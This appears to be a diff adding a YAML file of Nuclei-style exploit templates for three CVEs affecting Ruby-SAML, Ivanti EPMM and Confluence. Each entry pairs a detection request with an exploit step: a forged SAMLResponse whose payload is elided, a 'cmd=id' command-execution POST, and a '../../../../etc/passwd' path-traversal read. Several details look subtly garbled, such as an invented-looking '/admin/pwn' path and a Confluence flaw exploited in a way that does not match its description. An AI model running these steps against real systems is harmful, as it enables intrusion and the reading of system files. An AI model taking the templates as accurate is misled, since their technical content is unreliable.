@@ -1,0 +1,66 @@
+id: cve-2024-45409
+info:
+  name: Ruby-SAML Signature Forgery
+  author: FerzDevZ
+  severity: critical
+  description: Vulnerability in Ruby-SAML allows for signature forgery, leading to authentication bypass.
+requests:
+  - method: POST
+    path:
+      - "/saml/consume"
+    body: "SAMLResponse=PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wi..."
+    matchers:
+      - type: status
+        status: [302]
+exploit:
+  steps:
+    - method: POST
+      path: "/saml/consume"
+      body: "SAMLResponse=PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wi...[FORGED]..."
+      matchers:
+        - type: word
+          words: ["logged_in"]
+---
+id: cve-2023-35082
+info:
+  name: Ivanti EPMM Remote Code Execution
+  author: FerzDevZ
+  severity: critical
+  description: Remote code execution in Ivanti Endpoint Manager Mobile (EPMM) via API.
+requests:
+  - method: GET
+    path:
+      - "/mifs/aad/api/v2/authorized/users"
+    matchers:
+      - type: status
+        status: [200]
+exploit:
+  steps:
+    - method: POST
+      path: "/mifs/aad/api/v2/authorized/users/admin/pwn"
+      body: "cmd=id"
+      matchers:
+        - type: word
+          words: ["uid="]
+---
+id: cve-2023-22518
+info:
+  name: Confluence Improper Authorization
+  author: FerzDevZ
+  severity: critical
+  description: Improper authorization in Confluence Data Center and Server allows unauthenticated admin access.
+requests:
+  - method: GET
+    path:
+      - "/json/setup-restore.action"
+    matchers:
+      - type: status
+        status: [200]
+exploit:
+  steps:
+    - method: POST
+      path: "/json/setup-restore-local.action"
+      body: "fileName=../../../../etc/passwd"
+      matchers:
+        - type: word
+          words: ["root:x:0:0:"]
